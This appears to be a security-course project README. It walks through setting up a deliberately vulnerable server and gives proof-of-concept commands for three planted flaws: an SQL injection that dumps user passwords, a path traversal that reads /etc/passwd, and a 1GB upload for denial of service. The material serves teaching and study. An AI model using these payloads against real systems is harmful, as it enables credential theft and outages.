# csci4271-proj2
This project demonstrates vulnerabilities in a server application (bcpwm-server) running on port 443. The instructions guide users on setting up the server, interacting with its database, and identifying three security vulnerabilities. Each finding includes a proof of concept exploit and its expected outcome.

# Program Description
bcpwm-server is a multi-functional server application designed to support user registration, rule creation, and file management via various HTTP routes. The server uses an SQLite database to store user and rule data, and it interacts with the file system for file operations. However, due to insufficient input validation and insecure programming practices, the server contains vulnerabilities that attackers can exploit to:

1. Perform SQL Injection to extract sensitive data.
2. Execute Path Traversal attacks to access unauthorized files.
3. Cause a Denial of Service (DoS) by uploading excessively large files.

- Let url be the path to access 443
- "enter" means putting the string in the search bar in web browser
- lines without "enter" is input in terminal

Running the program:
- git clone...
- ./install.sh
- make
- sudo ./bcpwm-server
- -> Change to another terminal, navigate to the same directory

Setting up the database
- Adding a user with hexmail = "1", hexpass = "2":
- enter "< url >/init_client/31/32"
- Confirm user added:
- enter "< url >/confirm-client/31/32/<token>" (the token is from the program running sudo)
- Adding a rule
- enter "< url >/post-rule/init/admin/1"

# Finding 1: Inject SQL to extract all user credentials
- Expected result: List of all users and passwords
- payload=$(echo "' UNION SELECT user, password FROM user_pw_table;--" | xxd -p)
- curl -k "< url >/init_client/${payload}/31"

# Finding 2: Inject '../' into the file path parameter to read unauthorized files
- Expected result: Contents of /etc/passwd
- payload=$(echo "../../etc/passwd" | xxd -p)
- enter "< url >/get_rule/${payload}"

# Finding 3: Generate a large file (1GB) and upload it
- Expected result: Server becomes unresponsive or logs indicate resource exhaustion.
- dd if=/dev/zero of=largefile.txt bs=1M count=1024
- curl -X POST -F "file=@largefile.txt" -k "<url>/post-rule/init/validsite/validuser"
